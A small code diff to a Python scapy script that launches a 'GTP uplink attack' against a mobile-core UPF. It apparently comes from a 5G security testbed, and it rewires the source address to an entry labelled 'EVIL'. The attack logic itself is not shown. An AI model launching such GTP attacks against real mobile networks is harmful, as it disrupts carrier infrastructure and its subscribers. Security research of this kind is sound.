@@ -2,9 +2,9 @@ from scapy.all import *
 from scapy.contrib.gtp import *
 from scapy.layers.inet import IP, ICMP
 import sys
-from utils.logger import Log
 from scapy.all import arping, get_if_list
 import random
+from src import ip_list
 
 
 def new_seq(rand=False):
@@ -66,8 +66,8 @@ def start_gtp_uplink_attack(
 
 
 start_gtp_uplink_attack(
-    src_addr=SRC_ADDR,
-    upf_addr=UPF_ADDR,
+    src_addr=ip_list["EVIL"],
+    upf_addr=ip_list["UPF"],
     teid=TEID,
     ue_addr=UE_ADDR,
     dst_addr=DST_ADDR,
